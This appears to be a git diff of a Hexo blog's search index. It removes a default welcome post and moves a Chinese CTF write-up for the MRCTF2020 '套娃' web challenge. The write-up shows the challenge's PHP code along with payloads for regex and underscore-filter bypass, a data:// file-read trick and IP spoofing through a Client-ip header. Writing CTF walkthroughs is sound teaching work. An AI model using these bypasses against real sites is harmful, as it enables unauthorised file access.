@@ -1,24 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
     <url>/CTF/Web/BUU-Easy_Java/</url>
     <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
@@ -111,52 +93,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-[MRCTF2020]套娃的Wp</title>
-    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
-    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
-<ul>
-<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
-<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
-</blockquote>
-<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
-<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
-<p>payload1：<code>/?b u p t=23333%0A</code></p>
-<p><strong>访问下一个页面</strong>：</p>
-<ul>
-<li><input disabled type="checkbox"> 编码的特征认识</li>
-</ul>
-<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
-<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
-<blockquote>
-<p>alert()是js中的弹出函数</p>
-</blockquote>
-<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
-<p><strong>回显出第三个页面：</strong></p>
-<ul>
-<li><input disabled type="checkbox"> 代码审计</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>
-
-<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>
-
-<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
-<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
-<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
     <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
     <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
@@ -212,6 +148,52 @@
 
 <hr>
 <p>参考：<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[MRCTF2020]套娃的Wp</title>
+    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
+    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
+<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
+</blockquote>
+<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
+<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
+<p>payload1：<code>/?b u p t=23333%0A</code></p>
+<p><strong>访问下一个页面</strong>：</p>
+<ul>
+<li><input disabled type="checkbox"> 编码的特征认识</li>
+</ul>
+<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
+<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
+<blockquote>
+<p>alert()是js中的弹出函数</p>
+</blockquote>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
+<p><strong>回显出第三个页面：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 代码审计</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
+<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
 ]]></content>
       <categories>
         <category>Web</category>
